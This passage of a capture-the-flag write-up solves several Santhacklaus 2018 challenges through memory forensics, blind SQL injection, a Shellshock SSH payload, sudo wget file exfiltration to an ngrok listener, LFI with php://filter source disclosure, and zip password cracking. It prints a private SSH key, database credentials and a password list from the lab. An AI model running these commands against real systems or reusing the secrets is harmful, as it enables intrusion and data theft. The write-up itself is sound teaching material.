## Process memory dump in GIMP

During my search for a correct profile, I noticed the `mspaint.exe` process. According to this website: https://w00tsec.blogspot.com/2015/02/extracting-raw-pictures-from-memory.html

I tried to dump the process memory and open it in GIMP as raw picture.

```bash
$ volatility -f challenge.dmp --profile=Win10x64_10586 memdump -p 3372 -D .
************************************************************************
Writing mspaint.exe [  3372] to 3372.dmp

$ mv 3372.dmp mspaint.data
```

After few minutes burning my eyes, I finally found the Graal:

<center>
![](/img/writeups/santhacklaus2018/bret_1.png)
_Fig 2_: Bret Stiles statement
</center>

## Flag

> IMTLD{1m4gin4ti0N}

## Fun fact

You can use `strings` and `grep`, best friends of forensic analysts:

<center>
![](/img/writeups/santhacklaus2018/bret_2.png)
_Fig 3_: Kiss shutdown
</center>

# NetRunner 1/3

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | NetRunner 1/3       | Web         |   500    | 24     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_netrunner1.png)
_Fig 1_: "NetRunner 1/3" statement
</center>

## State of the art

Ok, we got a sexy website:

<center>
![](/img/writeups/santhacklaus2018/netrunner1_1.png)
_Fig 2_: Sexy website
</center>

A login form, we don't have to use scanner or something like that, I want to say "SQL injection".

After several tries, indeed, it's a full blind sql injection:

<center>
![](/img/writeups/santhacklaus2018/netrunner1_2.gif)
_Fig 3_: Time based SQL Injection
</center>

## Bypass
 
I could try to script something or use SQLMap to extract all the database. And it's probably that's what I would have done before SIGSEGv1 event.

I was near Geluchat during the CTF and he first blooded one of the hardest web challenge. He also explained me how he did. During his SQL injection he played with `LIMIT` SQL statement, let's try here:

<center>
![](/img/writeups/santhacklaus2018/netrunner1_3.gif)
_Fig 4_: Bypass form
</center>

## Flag

> IMTLD{w3b_1nT3rf4ceS_4r3_3v1L} 

# NetRunner 2/3

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | NetRunner 2/3       | App-Script         |   750    | 18     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_netrunner2.png)
_Fig 1_: "NetRunner 2/3" statement
</center>

## State of the art

At the end of the previous challenge we got the SSH private key of __puppet-master__ user:

```raw
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

```bash
$ ssh -i /home/maki/Documents/chall/imtld/netrunnners/priv.key puppet-master@51.75.202.113 -p 2021   

.___..___.___..__..___..___ __ .  .
  _/ [__   |  [__]  |  [__ /  `|__|
./__.[___  |  |  |  |  [___\__.|  |


Do not use Zetatech maintenance interface if you are not authorized by Zetatech Corporation.


████████████████████████████ CONNECTION ESTABLISHED ████████████████████████████


----------------------------- General Informations -----------------------------

Software Version     ::: 10.5.2546_b1 [OBSOLETE]
Client ID            ::: 1534D 4245 97554 P

General health       ::: [ALIVE]

Management interface ::: [ONLINE]
Maintenance link     ::: [ONLINE]



----------------------- Installed Cybernetic Prosthetics -----------------------

Zetatech Neural Processor MK.II   ::: [CONNECTION ERROR]
Zetatech Enforcement 10.A Sidearm ::: [NOT CONNECTED]
Zetatech Binoculars BT.4          ::: [NOT CONNECTED]


Connection to 51.75.202.113 closed.
```

Ok, the server is printing the above message and immediatly close the ssh connection.

## Exploitation

In this challenge, you have to find a way to keep the session open. I first tried to use `-N` parameter of SSH, but it doesn't work.

So I asked to Google: http://lmgtfy.com/?q=ssh+immediate+disconnection+ctf

And finally found this writeup: https://securitybytes.io/vulnhub-com-tr0ll2-ctf-walkthrough-9993042f8af8

So, go on, I tried with a Shellshock payload:

```bash
$ ssh -i /home/maki/Documents/chall/imtld/netrunnners/priv.key puppet-master@51.75.202.113 -p 2021 '() { :;}; /bin/bash'

.___..___.___..__..___..___ __ .  .
  _/ [__   |  [__]  |  [__ /  `|__|
./__.[___  |  |  |  |  [___\__.|  |


Do not use Zetatech maintenance interface if you are not authorized by Zetatech Corporation.
ls
client.note
status.sh
tech.note
id
uid=1001(puppet-master) gid=1001(puppet-master) groups=1001(puppet-master)
```

It work! But before going further, I want to have a fully functionnal bash: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

```bash
# On remote server
$ which python3
/usr/bin/python3

$ python3 -c "import pty;pty.spawn('/bin/bash')"
puppet-master@2a87f3ade358:~$ # Do CTRL + Z to suspend to current job

# On localhost
localhost $ stty raw -echo 
localhost $ fg # It will not be display
localhost $ reset 
reset: unknown terminal type unknown
Terminal type? xterm

# On remote server
puppet-master@2a87f3ade358:~$ id
uid=1001(puppet-master) gid=1001(puppet-master) groups=1001(puppet-master)
```

<center>
![](/img/writeups/santhacklaus2018/netrunner1_4.gif)
_Fig 2_: Full interactive shell
</center>

And now we got auto-completion, we can use CTRL + C, we can edit files with vim :D

```bash
puppet-master@2a87f3ade358:~$ cat client.note 

.___..___.___..__..___..___ __ .  .
  _/ [__   |  [__]  |  [__ /  `|__|
./__.[___  |  |  |  |  [___\__.|  |


:::: Client Note ::::

You can access to your web interface to have more informations.
You can use this maintenance interface anytime to check your Cybernetics Prosthetics status.
If you have any issues with Zetatech products, please contact us.

Note: the password is the same than your username.

:: IMTLD{Pr0t3ct_Y0uR_Gh0sT}
```

## Flag

> IMTLD{Pr0t3ct_Y0uR_Gh0sT}

# NetRunner 3/3

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | NetRunner 3/3       | App-Script         |   450    | 18     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_netrunner3.png)
_Fig 1_: "NetRunner 3/3" statement
</center>

## State of the art

At this point, the goal is pretty obvious: get privileged access. During a pentest there are some attack vectors:

* sudo misconfigured
* crontab or services running as privileged user
* suid binary or script to exploit

## Sudo misconfigured

Here, this is a misconfigured sudo:

```bash
$ sudo -l 
[sudo] password for puppet-master: puppet-master
Matching Defaults entries for puppet-master on 2a87f3ade358:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    lecture=never

User puppet-master may run the following commands on 2a87f3ade358:
    (puppet-master : zetatech-maintenance) /usr/bin/wget
```

Most of the time, the user can run a command as root without password. In this case, the vulnerability comes with the `zetatech-maintenance` group.

What could happen if we execute command with this group? We will getting group right :D

## Exploit

I don't have my VPS under my hand, then I will use `ngrok`, it allows us to open a port through their server and listen / send data on it: https://ngrok.com/

It works like that (picture from their official website):

<center>
![](https://ngrok.com/static/img/demo.png)
</center>

1. First localhost terminal:

```bash
$ ngrok tcp 1223
[...]
Web interface 
http://127.0.0.1:4040

Forwarding
tcp://0.tcp.ngrok.io:15462 -> localhost:1223        
[...]      
```

2. Second local host terminal

```bash
$ ping 0.tcp.ngrok.io                        
PING 0.tcp.ngrok.io (52.15.72.79) 56(84) bytes of data.
^C
--- 0.tcp.ngrok.io ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms

$ nc -lvp 1223       
Listening on [0.0.0.0] (family 0, port 1223)
```

3. On remote server terminal

```bash
puppet-master@2a87f3ade358:~$ sudo -g zetatech-maintenance wget --post-file /home/puppet-master/tech.not http://52.15.72.79:15462
```

And magic appears in our second localhost terminal:

```bash
$ nc -lvp 1223       
Listening on [0.0.0.0] (family 0, port 1223)
Connection from localhost 53726 received!
POST / HTTP/1.1
User-Agent: Wget/1.18 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 52.15.72.79:15462
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 266


.___..___.___..__..___..___ __ .  .
  _/ [__   |  [__]  |  [__ /  `|__|
./__.[___  |  |  |  |  [___\__.|  |


:::: Admin Note ::::

Branch the Zetatech Pad to Cybernetic Prosthetic client and use the following generated password.

:: IMTLD{Wh3r3_d03s_HuM4n1tY_3nd}
```

## Flag

> IMTLD{Wh3r3_d03s_HuM4n1tY_3nd}

# ArchDrive 1/3

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | ArchDrive 1/3       | Web         |   150    | 53     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_archdrive1.png)
_Fig 1_: "ArchDrive 1/3" statement
</center>

## State of the art

This comes with a really good looking website:

<center>
![](/img/writeups/santhacklaus2018/archdrive1_1.png)
_Fig 1_: ArchDrive index
</center>

I notice a strange GET parameter when clicking on `Reset it`:

> https://archdrive.santhacklaus.xyz/?page=reset.php

## Basic local file inclusion

I tried to include `/etc/passwd` file:

> https://archdrive.santhacklaus.xyz/?page=../../../../../../../../../etc/passwd

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
G0lD3N_Us3r:x:1000:1000:IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r},,,:/home/G0lD3N_Us3r:/bin/bash
```

w00t!

## Flag

> IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r}

# ArchDrive 2/3

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | ArchDrive 2/3       | Web         |   150    | 28     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_archdrive2.png)
_Fig 1_: "ArchDrive 2/3" statement
</center>

## State of the art

Ok, we got a __Local file inclusion__, let's try to use the base64 php wrapper (go on payload all the things):

> https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=reset.php

It gives me some base64 data, here is the decoded data:

```php
<?php session_start(); ?>
<!DOCTYPE html>
<html lang="en">
<head>
<title>Reset Your Password</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<link rel="stylesheet" type="text/css" href="css/util.css">
<link rel="stylesheet" type="text/css" href="css/main.css">
</head>
<body>
<div class="limiter">
    <div class="container-login100">
        <div class="wrap-login100">
            <form class="login100-form validate-form" method="post" action="?page=reset.php">
<span class="login100-form-title p-b-48">
<a href="index.php"><img class="logo-brand" src="images/archdrive-color.png" alt="ArchDrive logo"></a>
</span>
<span class="login100-form-title p-b-26">
ArchDrive
</span>
<p class="login100-form-title" style="font-size: 24px">Reset My Password</p></br>

<?php
    if(isset($_POST['recover']))
    {
    ?>
<p>Email sent !</p>
<?php
    }
    ?>


<div class="wrap-input100 validate-input" data-validate = "Valid email is: a@b.c">
<input class="input100" type="text" name="email">
<span class="focus-input100" data-placeholder="Email (only from @archdrive.corp)"></span>
</div>

<div class="container-login100-form-btn">
<div class="wrap-login100-form-btn">
<div class="login100-form-bgbtn"></div>
<button class="login100-form-btn" name="recover">Recover Password</button>
</div>
</div>
</form>
</div>
</div>
</div>


<div id="dropDownSelect1"></div>

<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<script src="vendor/animsition/js/animsition.min.js"></script>
<script src="vendor/bootstrap/js/popper.js"></script>
<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<script src="vendor/select2/select2.min.js"></script>
<script src="vendor/daterangepicker/moment.min.js"></script>
<script src="vendor/daterangepicker/daterangepicker.js"></script>
<script src="vendor/countdowntime/countdowntime.js"></script>
<script src="js/main.js"></script>

</body>
</html>
```

## Local file inclusion

The __index.php__ file doesn't work, I didn't succeed to extracted it. Nevermind, there is a __login.php__ file, found in the index form:

<center>
![](/img/writeups/santhacklaus2018/archdrive2_1.png)
_Fig 2_: login.php file
</center>

Then:

> https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=login.php

```php
<?php
  session_start();

  $state = new \stdClass();

  if ( isset($_POST['email']) && !empty($_POST['email']) ) {
    if ( isset($_POST['pass']) && !empty($_POST['pass']) ) {

      $bdd = mysqli_connect('database:3306', 'archdrive-corpo-bdd-admin', '8mkxdcwwyvtk36snF2b4TcEqSjh4Cc', 'ctf-archdrive-corp');
      if (mysqli_connect_errno()) {
          $state->return = 'error';
          $state->string = 'Connection error';
          $state_json = json_encode($state);
          echo $state_json;
          return;
      }

      $user = mysqli_real_escape_string($bdd, strtolower($_POST['email']));
      $pass = $_POST['pass'];
$sql = "SELECT user,password FROM `access-users` WHERE user='".$user."' AND password='".$pass."'";

      $res = mysqli_query($bdd, $sql);

      $num_row = mysqli_num_rows($res);
      $row=mysqli_fetch_assoc($res);

        if ( $num_row == 1 && $user === $row['user']) {
            $state->return = 'true';
            $_SESSION['logged'] = 1;
            header("Location: myfiles.php");

      } else {
          $state->return = 'false';
          header("Location: index.php");
      }
    }
  }
?>
```

Great, new file appeared: __myfiles.php__

> https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=myfiles.php

```php
<?php session_start();

    if($_SESSION['logged'] === 1)
    {
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>My Files</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
  <link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
  <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
  <link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
  <link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
  <link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
  <link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
  <link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
  <link rel="stylesheet" type="text/css" href="css/util.css">
  <link rel="stylesheet" type="text/css" href="css/main.css">
</head>
<body>
  <div class="limiter">
    <div class="container-login100">
      <div class="wrap-login100">
          <span class="login100-form-title p-b-48">
            <a href="index.php"><img class="logo-brand" src="images/archdrive-color.png" alt="ArchDrive logo"></a>
          </span>
          <span class="login100-form-title p-b-26">
            ArchDrive
          </span>

    <p class="login100-form-title" style="font-size: 24px">My Recent Documents</p></br>
            <ul>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/rib-bnp.gif">rib-bnp.gif</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/test.html">test.html</a></li>
            <li><a class="txt2" href="images/vacances1.jpg">Vacances_2018_1.jpg</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/CONFIDENTIEL.zip">CONFIDENTIEL.zip</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/facture_mobile_sfr.png">facture_mobile_sfr.png</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/camel.jpg">camel.jpg</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/cat.jpg">cat.jpg</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/documents">documents</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/funny_wtf.jpg">funny_wtf.jpg</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/freshandhappy.mp3">freshandhappy.mp3</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/intense.mp3">intense.mp3</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/recup.zip">recup.zip</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/funny.jpg">funny.jpg</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/goats.jpg">goats.jpg</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/lol.jpg">lol.jpg</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/rapport_SM.pdf">rapport_SM.pdf</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/media">media</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/these.pdf">these.pdf</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/these-2.pdf">these-2.pdf</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/wallpaper.jpg">wallpaper.jpg</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/VeraCrypt.zip">VeraCrypt.zip</a></li>
            </ul>

<div class="text-center p-t-115">
<form method="post" action="logout.php">
<button class="txt2" value="disconnect">
Log out.
</button>
</form>
</div>

      </div>
    </div>
  </div>


  <div id="dropDownSelect1"></div>

  <script src="vendor/jquery/jquery-3.2.1.min.js"></script>
  <script src="vendor/animsition/js/animsition.min.js"></script>
  <script src="vendor/bootstrap/js/popper.js"></script>
  <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
  <script src="vendor/select2/select2.min.js"></script>
  <script src="vendor/daterangepicker/moment.min.js"></script>
  <script src="vendor/daterangepicker/daterangepicker.js"></script>
  <script src="vendor/countdowntime/countdowntime.js"></script>
  <script src="js/main.js"></script>

</body>
</html>
<?php
    }
    else
    {
        include('error.php');
    }
?>
```

## File extraction

Ok, now I think I'm seeing files stored in the drive, I made a little script to extract them:

```python
#!/usr/bin/python2

import requests
import base64

file_list = ['21f64da1e5792c8295b964d159a14491/rib-bnp.gif', '21f64da1e5792c8295b964d159a14491/test.html', 'images/vacances1.jpg', '21f64da1e5792c8295b964d159a14491/CONFIDENTIEL.zip', '21f64da1e5792c8295b964d159a14491/facture_mobile_sfr.png', '21f64da1e5792c8295b964d159a14491/camel.jpg', '21f64da1e5792c8295b964d159a14491/cat.jpg', '21f64da1e5792c8295b964d159a14491/funny_wtf.jpg', '21f64da1e5792c8295b964d159a14491/freshandhappy.mp3', '21f64da1e5792c8295b964d159a14491/intense.mp3', '21f64da1e5792c8295b964d159a14491/recup.zip', '21f64da1e5792c8295b964d159a14491/funny.jpg', '21f64da1e5792c8295b964d159a14491/goats.jpg', '21f64da1e5792c8295b964d159a14491/lol.jpg', '21f64da1e5792c8295b964d159a14491/rapport_SM.pdf', '21f64da1e5792c8295b964d159a14491/these.pdf', '21f64da1e5792c8295b964d159a14491/these-2.pdf', '21f64da1e5792c8295b964d159a14491/wallpaper.jpg', '21f64da1e5792c8295b964d159a14491/VeraCrypt.zip','21f64da1e5792c8295b964d159a14491/media','21f64da1e5792c8295b964d159a14491/documents']

for i in file_list:
  r = requests.get("https://archdrive.santhacklaus.xyz/index.php?page=pHp://FilTer/convert.base64-encode/resource="+str(i))
  data = base64.b64decode(r.text.split('\r\n')[-1].replace(' ',''))

  filename = i.replace('/','_')
  print("[+] Result written in: {0}".format(filename))
  f = open(filename, 'wb')
  f.write(data)
  f.close()
```

The __CONFIDENTIEL.zip__ contains garbage, nothing usefull. But the __recup.zip__ is encrypted! 

## Bruteforce time

I got an encrypted zip file, I got a wordlist, let's call fcrackzip:

```bash
$ fcrackzip -v -D -u -p /home/maki/Tools/wordlist/rockyou.txt 21f64da1e5792c8295b964d159a14491_recup.zip
found file 'password.txt', (size cp/uc    271/   377, flags 9, chk 5aec)


PASSWORD FOUND!!!!: pw == hackerman

$ unzip 21f64da1e5792c8295b964d159a14491_recup.zip
Archive:  21f64da1e5792c8295b964d159a14491_recup.zip
[21f64da1e5792c8295b964d159a14491_recup.zip] password.txt password: hackerman
  inflating: password.txt

$ cat password.txt
=== FLAG ===

IMTLD{F1nd_Y0uR_W4y}

==== Facebook ===

P@ssw0rd123

=== Twitter ===

azertY#!?$

=== Job ===

Door: 5846
Computer: 0112#aqzsed

=== zip ===

ohm0-9Quirk
Finny5-polo2-Rule

=== VC ===

7Rex-Mazda0-hover1-Quid
Gourd-crown2-gao4-warp2 - Take On Me
0twain-Mao0-flash-6Goof-Gent

=== Portable ===

Windobe123

=== iPhone ===

123789
```

## Flag

> IMTLD{F1nd_Y0uR_W4y}

# ArchDrive 3/3

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | ArchDrive&nbsp;3/3       | Forensic/Crypto/WTF         |   200    | 12     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_archdrive3.png)
_Fig 1_: "ArchDrive 3/3" statement
</center>

## State of the art

According to the previous part, here is what we got:

* There is something to do with Veracrypt
* Veracrypt container hasn't got magic number (documents and media could be containers)
* password.txt contains __VC password__ (VC -> Veracrypt)

## Decrypting and mounting

There are 3 keys:

* 7Rex-Mazda0-hover1-Quid
* Gourd-crown2-gao4-warp2 - Take On Me
* 0twain-Mao0-flash-6Goof-Gent

<center>
![](/img/writeups/santhacklaus2018/archdrive3_1.png)
_Fig 2_: Documents and Media mounted
</center>

* documents -> 0twain-Mao0-flash-6Goof-Gent
* media -> 7Rex-Mazda0-hover1-Quid

A little tip about forensic, when you're mounting something: Make a copy of your volume, and work and that copy, it will prevent all unannounced change.

```bash
$ lsblk
NAME             MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINT
loop0              7:0    0    10M  0 loop  
└─veracrypt1     254:4    0   9,8M  0 dm    /mnt/veracrypt1
loop1              7:1    0    30M  0 loop  
└─veracrypt2     254:5    0  29,8M  0 dm    /mnt/veracrypt2

$ sudo dd if=/dev/mapper/veracrypt1 of=clear_document.dmp bs=4M
$ sudo dd if=/dev/mapper/veracrypt2 of=clear_media.dmp bs=4M
```

After copying, I'm using `testdisk` to browse into.

```bash
$ sudo testdisk /path/to/document.dmp 
Proceed -> None -> Advanced -> Undelete
```

<center>
![](/img/writeups/santhacklaus2018/archdrive3_2.png)
_Fig 3_: Documents in documents container
</center>

<center>
![](/img/writeups/santhacklaus2018/archdrive3_3.png)
_Fig 4_: Documents in media container
</center>

Using `testdisk` allows me to find erased files. The MP3 in `documents` containers is not really helpful.

## Hidden volume

I remind me something, when I tried to learn how veracrypt work: hidden volume.

> https://www.veracrypt.fr/en/Hidden%20Volume.html

There is one more key in the `password.txt` file:

> Gourd-crown2-gao4-warp2 - Take On Me

And in the `media` container, there is a MP3 file called: 

